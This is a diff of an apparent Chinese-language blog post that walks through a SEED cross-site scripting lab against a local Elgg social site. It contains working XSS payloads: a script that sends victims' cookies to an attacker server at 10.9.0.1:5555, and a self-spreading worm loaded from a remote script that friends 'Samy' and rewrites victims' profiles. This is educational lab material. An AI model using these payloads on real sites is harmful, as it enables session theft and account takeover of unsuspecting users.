@@ -10,13 +10,12 @@
 <meta name="description" content="Task 1: 上传恶意消息以显示警告窗口
 
 此任务的目标是在 Elgg 的个人资料中嵌入一个 JavaScript 程序，以便当其他用户查看你的个人资料时会执行 JavaScript 程序并显示一个警告窗口。
-
 1. 直接嵌入
 以下的 JavaScript 代码将显示一个警告窗口：">
 <meta name="author" content="Mi Yu">
 <link rel="canonical" href="https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/">
 <meta name="google-site-verification" content="JEK1eXuLRduZRvpZ01WxuqtEwCBXrfSU3TuSjv3xrTI">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.9b0e781d3140906dac623fe947b8150fa8935b3bc73b11377f724f385f0093be.css" integrity="sha256-mw54HTFAkG2sYj/pR7gVD6iTWzvHOxE3f3JPOF8Ak74=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.717ba9175afbea410a2ccf484107922fcb525c54300c31112304c5b2563e1487.css" integrity="sha256-cXupF1r76kEKLM9IQQeSL8tSXFQwDDERIwTFslY&#43;FIc=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://smera1d0.github.io/images/favicon.svg">
 <link rel="icon" type="image/png" sizes="16x16" href="https://smera1d0.github.io/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="https://smera1d0.github.io/favicon-32x32.png">
@@ -81,7 +80,6 @@
 <meta property="og:description" content="Task 1: 上传恶意消息以显示警告窗口
 
 此任务的目标是在 Elgg 的个人资料中嵌入一个 JavaScript 程序，以便当其他用户查看你的个人资料时会执行 JavaScript 程序并显示一个警告窗口。
-
 1. 直接嵌入
 以下的 JavaScript 代码将显示一个警告窗口：" />
 <meta property="og:type" content="article" />
@@ -96,7 +94,6 @@
 <meta name="twitter:description" content="Task 1: 上传恶意消息以显示警告窗口
 
 此任务的目标是在 Elgg 的个人资料中嵌入一个 JavaScript 程序，以便当其他用户查看你的个人资料时会执行 JavaScript 程序并显示一个警告窗口。
-
 1. 直接嵌入
 以下的 JavaScript 代码将显示一个警告窗口："/>
 
@@ -336,8 +333,7 @@
 
   <div class="post-content"><h2 id="task-1-上传恶意消息以显示警告窗口">Task 1: 上传恶意消息以显示警告窗口<a hidden class="anchor" aria-hidden="true" href="#task-1-上传恶意消息以显示警告窗口">#</a></h2>
 <blockquote>
-<p>此任务的目标是在 Elgg 的个人资料中嵌入一个 JavaScript 程序，以便当其他用户查看你的个人资料时会执行 JavaScript 程序并显示一个警告窗口。</p>
-</blockquote>
+<p>此任务的目标是在 Elgg 的个人资料中嵌入一个 JavaScript 程序，以便当其他用户查看你的个人资料时会执行 JavaScript 程序并显示一个警告窗口。</p></blockquote>
 <h3 id="1-直接嵌入">1. 直接嵌入<a hidden class="anchor" aria-hidden="true" href="#1-直接嵌入">#</a></h3>
 <p>以下的 JavaScript 代码将显示一个警告窗口：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS&#39;</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
@@ -381,16 +377,14 @@ samy     | seedsamy
 <img src="https://s2.loli.net/2024/11/08/p6mQl5dWDZCaV3e.png" alt="image-20241108215304951" style="zoom:50%;" />
 <h2 id="task-2上传恶意代码以显示-cookies">Task 2：上传恶意代码以显示 Cookies<a hidden class="anchor" aria-hidden="true" href="#task-2上传恶意代码以显示-cookies">#</a></h2>
 <blockquote>
-<p>此任务的目标是在你的 Elgg 的个人资料中嵌入一个 JavaScript 程序，使得当其他用户查看你的个人资料时该用户的 cookies 将显示在警告窗口中。</p>
-</blockquote>
+<p>此任务的目标是在你的 Elgg 的个人资料中嵌入一个 JavaScript 程序，使得当其他用户查看你的个人资料时该用户的 cookies 将显示在警告窗口中。</p></blockquote>
 <p>修改 Task 1 的代码，使用 <code>document.cookie</code> 获取当前页面的所有cookies：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </span></span></code></pre></div><p>效果如下所示：</p>
 <img src="https://s2.loli.net/2024/12/07/4qJ1BvAs3VtFMSO.png" alt="image-20241106092710107" style="zoom:50%;" />
 <h2 id="task-3窃取受害者机器的-cookies">Task 3：窃取受害者机器的 Cookies<a hidden class="anchor" aria-hidden="true" href="#task-3窃取受害者机器的-cookies">#</a></h2>
 <blockquote>
-<p>在前一个任务中，攻击者编写的恶意 JavaScript 代码可以打印出用户的 cookies，但只有用户可以看到 cookies，而不是攻击者。在这个任务中，攻击者希望 JavaScript 代码将用户 cookies 发送给自己。</p>
-</blockquote>
+<p>在前一个任务中，攻击者编写的恶意 JavaScript 代码可以打印出用户的 cookies，但只有用户可以看到 cookies，而不是攻击者。在这个任务中，攻击者希望 JavaScript 代码将用户 cookies 发送给自己。</p></blockquote>
 <p>我们可以使用 <code>&lt;img&gt;</code> 标签实现 cookies 的发送，当 <code>&lt;img&gt;</code> 标签被插入到页面时，浏览器发出 URL 请求，利用 URL 请求，将 cookies 发送到攻击者的服务器。</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
 </span></span><span class="line"><span class="cl">	<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=http://10.9.0.1:5555?c=&#39;</span><span class="o">+</span> <span class="nx">escape</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39; &gt;&#39;</span><span class="p">);</span>
@@ -408,8 +402,7 @@ samy     | seedsamy
 <p>可以发现红框中的部分为访问者的 Cookie 信息，成功窃取到了受害者的 Cookie。</p>
 <h2 id="task-4成为受害者的朋友">Task 4：成为受害者的朋友<a hidden class="anchor" aria-hidden="true" href="#task-4成为受害者的朋友">#</a></h2>
 <blockquote>
-<p>我们将编写一个 XSS 蠕虫，使得任何其他访问 Samy 页面的用户都会加 Samy 为朋友。</p>
-</blockquote>
+<p>我们将编写一个 XSS 蠕虫，使得任何其他访问 Samy 页面的用户都会加 Samy 为朋友。</p></blockquote>
 <h3 id="1-确定参数">1. 确定参数<a hidden class="anchor" aria-hidden="true" href="#1-确定参数">#</a></h3>
 <p>在编写恶意的 JavaScript 程序之前，我们需要先搞清楚添加朋友是通过请求哪些参数来实现的，使用 FireFox 的插件 HTTP header live 可以获取发送朋友请求时的全部请求信息，我们先登陆 Samy 的账户，并对 Alice 发送好友请求，并使用 HTTP header live 插件来捕获信息。</p>
 <p>依次点击 Members -&gt; Alice -&gt; Add friend 即可添加好友，点击 Add friend 时捕获到的 GET 请求如下所示：</p>
@@ -473,8 +466,7 @@ samy     | seedsamy
 </ul>
 <h2 id="task-5修改受害者的个人资料">Task 5：修改受害者的个人资料<a hidden class="anchor" aria-hidden="true" href="#task-5修改受害者的个人资料">#</a></h2>
 <blockquote>
-<p>这个任务的目标是在受害者访问 Samy 的界面时修改受害者的个人资料。</p>
-</blockquote>
+<p>这个任务的目标是在受害者访问 Samy 的界面时修改受害者的个人资料。</p></blockquote>
 <h3 id="1-确定参数-1">1. 确定参数<a hidden class="anchor" aria-hidden="true" href="#1-确定参数-1">#</a></h3>
 <p>修改 Profile 的时候使用插件 HTTP Header Live 抓取 URL，发现修改时会发送一个 <strong>POST</strong> 请求：</p>
 <img src="https://s2.loli.net/2024/12/07/s7ghGQvmV6bn3Pz.png" alt="image-20241108200443299" style="zoom:50%;" />
@@ -532,8 +524,7 @@ samy     | seedsamy
 </ul>
 <h2 id="task-6编写自传播-xss-蠕虫">Task 6：编写自传播 XSS 蠕虫<a hidden class="anchor" aria-hidden="true" href="#task-6编写自传播-xss-蠕虫">#</a></h2>
 <blockquote>
-<p>恶意 JavaScript 程序要成为真正的蠕虫，应该要实现自传播。也就是说，每当有人查看受感染的个人资料时，他们的个人资料不仅会被修改，蠕虫还会传播到他们的个人资料中，进一步影响查看这些新感染资料的其他人。在这个任务中，你需要实现这样一个蠕虫，它不仅修改受害者的个人资料并将用户“Samy”添加为朋友，还将蠕虫本身的副本添加到受害者的个人资料中，这样受害者就变成了攻击者。</p>
-</blockquote>
+<p>恶意 JavaScript 程序要成为真正的蠕虫，应该要实现自传播。也就是说，每当有人查看受感染的个人资料时，他们的个人资料不仅会被修改，蠕虫还会传播到他们的个人资料中，进一步影响查看这些新感染资料的其他人。在这个任务中，你需要实现这样一个蠕虫，它不仅修改受害者的个人资料并将用户“Samy”添加为朋友，还将蠕虫本身的副本添加到受害者的个人资料中，这样受害者就变成了攻击者。</p></blockquote>
 <h3 id="1-link-方法">1. Link 方法<a hidden class="anchor" aria-hidden="true" href="#1-link-方法">#</a></h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://www.miyu.com:9999/xss_worm.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </span></span></code></pre></div><p>可以使用 <code>src</code> 属性嵌入恶意脚本，并利用这个恶意脚本将以上这段代码传递到其他人的 Profile，这样就实现了自传播的 XSS 蠕虫。</p>
